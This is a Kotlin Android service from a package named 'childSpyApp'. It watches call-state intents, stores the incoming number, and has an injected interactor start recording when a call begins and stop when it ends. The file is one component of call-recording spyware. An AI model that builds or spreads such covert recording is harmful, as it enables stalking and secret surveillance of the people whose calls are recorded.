package sammy.mutahi.gicheru.childSpyApp.services.calls

import android.content.Intent
import sammy.mutahi.gicheru.childSpyApp.services.base.BaseService
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.COMMAND_TYPE
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.PHONE_NUMBER
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.STATE_CALL_END
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.STATE_CALL_START
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.STATE_INCOMING_NUMBER
import javax.inject.Inject

/**
 * Created by luis rafael on 13/03/18.
 */
class CallsService : BaseService(), InterfaceServiceCalls {

    private var phoneNumber: String? = null

    @Inject
    lateinit var interactor: InterfaceInteractorCalls<InterfaceServiceCalls>

    override fun onCreate() {
        super.onCreate()
        if (getComponent() != null) {
            getComponent()!!.inject(this)
            interactor.onAttach(this)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent != null) intent.setCallIntent()
        return super.onStartCommand(intent, flags, startId)
    }

    private fun Intent.setCallIntent() {

        val commandType = getIntExtra(COMMAND_TYPE, 0)

        if (commandType != 0) {

            when (commandType) {
                STATE_INCOMING_NUMBER -> if (phoneNumber == null) phoneNumber = getStringExtra(PHONE_NUMBER)
                STATE_CALL_START -> if (phoneNumber != null) interactor.startRecording(phoneNumber)
                STATE_CALL_END -> {
                    phoneNumber = null
                    interactor.stopRecording()
                }
            }
        }
    }

    override fun stopServiceCalls() {
        stopSelf()
    }

    override fun onDestroy() {
        interactor.onDetach()
        clearDisposable()
        super.onDestroy()
    }


}